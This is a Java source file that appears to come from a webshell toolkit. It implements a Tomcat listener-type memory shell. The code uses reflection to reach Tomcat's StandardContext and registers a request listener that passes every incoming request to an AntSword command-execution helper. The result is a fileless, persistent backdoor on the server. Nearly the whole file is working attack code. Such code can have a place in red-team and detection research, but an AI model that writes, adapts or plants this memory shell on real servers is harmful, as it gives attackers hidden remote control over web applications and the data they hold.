package com.spkiddai.memoryserver.Shell;

import com.spkiddai.memoryserver.Tools.AntSwordTool;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;

import javax.servlet.ServletContext;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import java.lang.reflect.Field;

public class ListenerShell implements ServletRequestListener {

    // 当请求被初始化时调用的方法
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        try {
            RequestFacade servletRequest = (RequestFacade) servletRequestEvent.getServletRequest();
            Field requestField = servletRequest.getClass().getDeclaredField("request");
            requestField.setAccessible(true);
            Request request = (Request) requestField.get(servletRequest);
            Response response = request.getResponse();
            AntSwordTool antswordUtil = new AntSwordTool();
            antswordUtil.exec(request,response);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // 当请求被销毁时调用的方法
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
    }

    /**
     * 向Tomcat注册监听器
     *
     * @param request 当前的HttpServletRequest请求对象
     */
    public void addListener(HttpServletRequest request) throws Exception {
        ServletContext servletContext = request.getServletContext();
        StandardContext context = getContext(servletContext);

        // 创建ListenerTest实例
        ServletRequestListener listener = new ListenerShell();

        // 添加监听器
        context.addApplicationEventListener(listener);
    }

    /**
     * 从ServletContext中获取StandardContext对象
     *
     * @param servletContext Servlet上下文对象
     * @return 返回StandardContext对象
     */
    public static StandardContext getContext(ServletContext servletContext) throws Exception {
        StandardContext context = null;

        while (context == null) {
            Field f = servletContext.getClass().getDeclaredField("context");
            f.setAccessible(true);
            Object object = f.get(servletContext);

            if (object instanceof ServletContext) {
                servletContext = (ServletContext) object;
            } else if (object instanceof StandardContext) {
                context = (StandardContext) object;
            }
        }
        return context;
    }
}
